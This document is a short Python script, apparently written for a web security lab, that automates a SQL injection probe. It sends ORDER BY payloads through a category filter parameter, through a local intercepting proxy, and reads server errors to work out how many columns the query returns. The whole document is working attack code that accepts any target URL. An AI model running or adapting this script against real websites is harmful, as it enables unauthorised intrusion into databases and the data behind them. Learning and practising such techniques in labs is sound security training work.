# ORDER BY and UNION to determine number of columns.
# ?url =1'+ORDER+BY+3-- to determine number of columns and UNION+SELECT+NULL,+NULL,+NULL-- for selecting columns.

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli_num_cols(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        sqli_payload = f"'+ORDER+BY+{i}--"
        r =requests.get(url+path+sqli_payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i-1
        i = i+1
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)
    
    print("***** Finding Number of columns *****")

    num_cols = exploit_sqli_num_cols(url)

    if num_cols:
        print(f"The number of columns is: {num_cols}.")
    else:
        print("SQL Injection was not successful.")